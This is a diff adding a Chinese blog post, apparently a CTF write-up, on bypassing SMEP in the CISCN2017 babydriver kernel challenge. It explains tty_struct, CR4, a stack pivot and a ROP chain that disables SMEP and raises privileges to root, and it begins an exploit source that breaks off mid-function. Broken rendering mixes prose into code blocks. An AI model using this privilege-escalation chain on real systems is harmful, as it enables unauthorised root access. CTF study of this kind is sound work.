@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep | sir</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="是缘是情是童真 还是意外有泪有罪有付出 还有忍耐">
+<meta name="keywords" content="Linux-kernel">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep">
+<meta property="og:url" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/index.html">
+<meta property="og:site_name" content="sir">
+<meta property="og:description" content="是缘是情是童真 还是意外有泪有罪有付出 还有忍耐">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/img/kernel3_6.png">
+<meta property="og:image" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/cr4.png">
+<meta property="og:image" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/img/kernel3_swapgs.png">
+<meta property="og:image" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/img/kernel3_iretq.png">
+<meta property="og:updated_time" content="2019-08-24T13:08:33.106Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep">
+<meta name="twitter:description" content="是缘是情是童真 还是意外有泪有罪有付出 还有忍耐">
+<meta name="twitter:image" content="https://cc-sir.github.io/2019/08/24/Linux-kernel3/img/kernel3_6.png">
+  
+    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/touxiang.png" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                            
+                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/Android/" style="font-size: 10px;">-Android</a> <a href="/tags/Windows/" style="font-size: 10px;">-Windows</a> <a href="/tags/pwn-堆/" style="font-size: 10px;">-pwn-堆</a> <a href="/tags/writeup/" style="font-size: 13.33px;">-writeup</a> <a href="/tags/Linux-kernel/" style="font-size: 20px;">Linux-kernel</a> <a href="/tags/pwn-Fmtstr/" style="font-size: 10px;">pwn-Fmtstr</a> <a href="/tags/pwn-堆/" style="font-size: 16.67px;">pwn-堆</a> <a href="/tags/pwn-栈/" style="font-size: 20px;">pwn-栈</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/渗透/" style="font-size: 10px;">渗透</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">我已无力接住你，再也不能抗风雨</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/touxiang.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                    
+                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-Linux-kernel3" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/08/24/Linux-kernel3/" class="article-date">
+      <time datetime="2019-08-24T13:08:33.106Z" itemprop="datePublished">2019-08-24</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux-kernel/">Linux-kernel</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>是缘是情是童真 还是意外<br>有泪有罪有付出 还有忍耐</p>
+<a id="more"></a>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>smep的全称是<figure class="highlight plain"><figcaption><span>Mode Execution Protection```,它是内核的一种保护机制,作用是当CPU处于ring0模式的时候，如果执行了用户空间的代码就会触发页错误,很明现这个保护机制就是为了防止ret2usr攻击的....</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">这里为了演示如何绕过这个保护机制,我仍然使用的是CISCN2017 babydriver,这道题基本分析和利用UAF的方法原理我已经在[kernel pwn--UAF](https://bbs.pediy.com/thread-252826.htm)这篇文章中做了解释,在这里就不再阐述了,环境也是放在[github](https://github.com/cc-sir/ctf-challenge/tree/master/2017CISCN%20babydriver)上面的,需要的可以自行下载学习....</span><br><span class="line"></span><br><span class="line"># 前置知识</span><br><span class="line">## ptmx &amp;&amp; tty_struct &amp;&amp; tty_operations</span><br><span class="line">```ptmx```设备是```tty```设备的一种,```open```函数被```tty```核心调用, 当一个用户对这个```tty```驱动被分配的设备节点调用```open```时```tty```核心使用一个指向分配给这个设备的```tty_struct```结构的指针调用它,也就是说我们在调用了```open```函数了之后会创建一个```tty_struct```结构体,然而最关键的是这个```tty_struct```也是通过```kmalloc```申请出来的一个堆空间,下面是关于```tty_struct```结构体申请的一部分源码:</span><br><span class="line">```cpp</span><br><span class="line">struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)</span><br><span class="line">&#123;</span><br><span class="line">	struct tty_struct *tty;</span><br><span class="line"></span><br><span class="line">	tty = kzalloc(sizeof(*tty), GFP_KERNEL);</span><br><span class="line">	if (!tty)</span><br><span class="line">		return NULL;</span><br><span class="line"></span><br><span class="line">	kref_init(&amp;tty-&gt;kref);</span><br><span class="line">	tty-&gt;magic = TTY_MAGIC;</span><br><span class="line">	tty_ldisc_init(tty);</span><br><span class="line">	tty-&gt;session = NULL;</span><br><span class="line">	tty-&gt;pgrp = NULL;</span><br><span class="line">	mutex_init(&amp;tty-&gt;legacy_mutex);</span><br><span class="line">	mutex_init(&amp;tty-&gt;throttle_mutex);</span><br><span class="line">	init_rwsem(&amp;tty-&gt;termios_rwsem);</span><br><span class="line">	mutex_init(&amp;tty-&gt;winsize_mutex);</span><br><span class="line">	init_ldsem(&amp;tty-&gt;ldisc_sem);</span><br><span class="line">	init_waitqueue_head(&amp;tty-&gt;write_wait);</span><br><span class="line">	init_waitqueue_head(&amp;tty-&gt;read_wait);</span><br><span class="line">	INIT_WORK(&amp;tty-&gt;hangup_work, do_tty_hangup);</span><br><span class="line">	mutex_init(&amp;tty-&gt;atomic_write_lock);</span><br><span class="line">	spin_lock_init(&amp;tty-&gt;ctrl_lock);</span><br><span class="line">	spin_lock_init(&amp;tty-&gt;flow_lock);</span><br><span class="line">	INIT_LIST_HEAD(&amp;tty-&gt;tty_files);</span><br><span class="line">	INIT_WORK(&amp;tty-&gt;SAK_work, do_SAK_work);</span><br><span class="line"></span><br><span class="line">	tty-&gt;driver = driver;</span><br><span class="line">	tty-&gt;ops = driver-&gt;ops;</span><br><span class="line">	tty-&gt;index = idx;</span><br><span class="line">	tty_line_name(driver, idx, tty-&gt;name);</span><br><span class="line">	tty-&gt;dev = tty_get_device(tty);</span><br><span class="line"></span><br><span class="line">	return tty;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```cpp</span><br><span class="line">static inline void *kzalloc(size_t size, gfp_t flags)</span><br><span class="line">&#123;</span><br><span class="line">	return kmalloc(size, flags | __GFP_ZERO);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而正是这个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">这个```tty_struct```结构体的大小是0x2e0,源码如下:</span><br><span class="line">```cpp</span><br><span class="line">struct tty_struct &#123;</span><br><span class="line">    int magic;</span><br><span class="line">    struct kref kref;</span><br><span class="line">    struct device *dev;</span><br><span class="line">    struct tty_driver *driver;</span><br><span class="line">    const struct tty_operations *ops;     // tty_operations结构体</span><br><span class="line">    int index;</span><br><span class="line">    /* Protects ldisc changes: Lock tty not pty */</span><br><span class="line">    struct ld_semaphore ldisc_sem;</span><br><span class="line">    struct tty_ldisc *ldisc;</span><br><span class="line">    struct mutex atomic_write_lock;</span><br><span class="line">    struct mutex legacy_mutex;</span><br><span class="line">    struct mutex throttle_mutex;</span><br><span class="line">    struct rw_semaphore termios_rwsem;</span><br><span class="line">    struct mutex winsize_mutex;</span><br><span class="line">    spinlock_t ctrl_lock;</span><br><span class="line">    spinlock_t flow_lock;</span><br><span class="line">    /* Termios values are protected by the termios rwsem */</span><br><span class="line">    struct ktermios termios, termios_locked;</span><br><span class="line">    struct termiox *termiox;    /* May be NULL for unsupported */</span><br><span class="line">    char name[64];</span><br><span class="line">    struct pid *pgrp;       /* Protected by ctrl lock */</span><br><span class="line">    struct pid *session;</span><br><span class="line">    unsigned long flags;</span><br><span class="line">    int count;</span><br><span class="line">    struct winsize winsize;     /* winsize_mutex */</span><br><span class="line">    unsigned long stopped:1,    /* flow_lock */</span><br><span class="line">              flow_stopped:1,</span><br><span class="line">              unused:BITS_PER_LONG - 2;</span><br><span class="line">    int hw_stopped;</span><br><span class="line">    unsigned long ctrl_status:8,    /* ctrl_lock */</span><br><span class="line">              packet:1,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - 9;</span><br><span class="line">    unsigned int receive_room;  /* Bytes free for queue */</span><br><span class="line">    int flow_change;</span><br><span class="line">    struct tty_struct *link;</span><br><span class="line">    struct fasync_struct *fasync;</span><br><span class="line">    wait_queue_head_t write_wait;</span><br><span class="line">    wait_queue_head_t read_wait;</span><br><span class="line">    struct work_struct hangup_work;</span><br><span class="line">    void *disc_data;</span><br><span class="line">    void *driver_data;</span><br><span class="line">    spinlock_t files_lock;      /* protects tty_files list */</span><br><span class="line">    struct list_head tty_files;</span><br><span class="line">#define N_TTY_BUF_SIZE 4096</span><br><span class="line">    int closing;</span><br><span class="line">    unsigned char *write_buf;</span><br><span class="line">    int write_cnt;</span><br><span class="line">    /* If the tty has a pending do_SAK, queue it here - akpm */</span><br><span class="line">    struct work_struct SAK_work;</span><br><span class="line">    struct tty_port *port;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></p>
+<p>而在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">```cpp</span><br><span class="line">struct tty_operations &#123;</span><br><span class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</span><br><span class="line">            struct file *filp, int idx);</span><br><span class="line">    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    int  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    void (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    void (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    int  (*write)(struct tty_struct * tty,</span><br><span class="line">              const unsigned char *buf, int count);</span><br><span class="line">    int  (*put_char)(struct tty_struct *tty, unsigned char ch);</span><br><span class="line">    void (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    int  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    int  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    int  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            unsigned int cmd, unsigned long arg);</span><br><span class="line">    long (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 unsigned int cmd, unsigned long arg);</span><br><span class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    void (*throttle)(struct tty_struct * tty);</span><br><span class="line">    void (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    void (*stop)(struct tty_struct *tty);</span><br><span class="line">    void (*start)(struct tty_struct *tty);</span><br><span class="line">    void (*hangup)(struct tty_struct *tty);</span><br><span class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</span><br><span class="line">    void (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    void (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</span><br><span class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</span><br><span class="line">    int (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    int (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            unsigned int set, unsigned int clear);</span><br><span class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    int (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line">#ifdef CONFIG_CONSOLE_POLL</span><br><span class="line">    int (*poll_init)(struct tty_driver *driver, int line, char *options);</span><br><span class="line">    int (*poll_get_char)(struct tty_driver *driver, int line);</span><br><span class="line">    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);</span><br><span class="line">#endif</span><br><span class="line">    int (*proc_show)(struct seq_file *, void *);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这个里面全是我们最喜欢的函数指针….<br>当我们往上面所<figure class="highlight plain"><figcaption><span>(*write)(struct tty_struct * tty,const unsigned char *buf, int count);```函数....</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">## Smep</span><br><span class="line">现在我们来说一下系统是怎么知道这个```Smep```保护机制是开启的还是关闭的....</span><br><span class="line">在系统当中有一个```CR4寄存器```,它的值判断是否开启```smep```保护的关键，当```CR4寄存器```的第```20```位是1的时候,保护开启;是0到时候，保护关闭:</span><br><span class="line">![CR4](./img/kernel3_1.PNG)</span><br><span class="line">举一个例子:</span><br><span class="line">当CR4的值为0x1407f0的时候，```smep```保护开启:</span><br><span class="line">```cpp</span><br><span class="line">$CR4 = 0x1407f0 = 0b0001 0100 0000 0111 1111 0000</span><br></pre></td></tr></table></figure></p>
+<p>当CR4的值为0x6f0的时候，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```cpp</span><br><span class="line">$CR4 = 0x6f0 = 0b0000 0000 0000 0110 1111 0000</span><br></pre></td></tr></table></figure></p>
+<p>但是该寄存器的值无法通过gdb直接查看，只能通过kernel crash时产生的信息查看,不过我们仍然是可以通过mov指令去修改这个寄存器的值的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov cr4,0x6f0</span><br></pre></td></tr></table></figure></p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为此题没有开kaslr保护,所以简化了我们一些步骤,但是在此方法中是我们前面的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. 利用UAF漏洞,去控制利用```tty_struct```结构体的空间,修改真实的```tty_operations```的地址到我们构造的```tty_operations```;</span><br><span class="line">2. 构造一个tty_operations，修改其中的write函数为我们的rop;</span><br><span class="line">3. 利用修改的write函数来劫持程序流;</span><br><span class="line">但是其中需要解决的一个问题是,我们并没有控制到栈,所以在rop的时候需要想办法进行栈转移:</span><br><span class="line">不过我们可以通过调试来想想办法,先把```tty_operations```的内容替换为这个样子:</span><br><span class="line">```cpp</span><br><span class="line">for(i = 0; i &lt; 30; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_opera[i] = 0xffffffffffffff00 + i; </span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_opera[7] = 0xffffffffc0000130;  //babyread_addr</span><br></pre></td></tr></table></figure></p>
+<p>我们先把<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">![rop1](./img/kernel3_3.png)</span><br><span class="line">![tty_operations](./img/kernel3_4.png)</span><br><span class="line">然后我们可以通过栈回溯,重新在调用```tty_operations[7]```的位置下断点看看:</span><br><span class="line">![rop2](./img/kernel3_5.png)</span><br><span class="line">可以清楚的看到程序的执行流程了,所以我们的就可以在这里进行栈转移操作了,利用这些指令就可以帮我们转移栈了:</span><br><span class="line">```cpp</span><br><span class="line">mov rsp,rax</span><br><span class="line">xchg rsp,rax</span><br></pre></td></tr></table></figure></p>
+<p>所以最终tty_operations的构造如下:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_opera[i] = <span class="number">0xffffffff8181bfc5</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_opera[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>;     <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_opera[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;            <span class="comment">//rop链的地址</span></span><br><span class="line">    fake_tty_opera[<span class="number">3</span>] = <span class="number">0xffffffff8181bfC5</span>;     <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    fake_tty_opera[<span class="number">7</span>] = <span class="number">0xffffffff8181bfc5</span>;     <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br></pre></td></tr></table></figure></p>
+<p>为了方便理解,我们把提权,关闭smep等操作都放到rop链里面:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> rop[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff810d238d</span>;      <span class="comment">//pop_rdi_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81004d80</span>;      <span class="comment">//mov_cr4_rdi_pop_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6161616161</span>;            <span class="comment">//junk</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81063694</span>;      <span class="comment">//swapgs_pop_rbp_ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6161616161</span>;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff814e35ef</span>;      <span class="comment">// iretq; ret;</span></span><br><span class="line">rop[i++] = (<span class="keyword">size_t</span>)shell;</span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_eflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></figure></p>
+<p>其实这个rop链就是比我们的之前的<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># EXP</span><br><span class="line">poc.c:</span><br><span class="line">```cpp</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;fcntl.h&gt;</span><br><span class="line">unsigned long user_cs, user_ss, user_eflags,user_sp;</span><br><span class="line">size_t commit_creds_addr = 0xffffffff810a1420;</span><br><span class="line">size_t prepare_kernel_cred_addr = 0xffffffff810a1810;</span><br><span class="line">void* fake_tty_opera[30];</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">    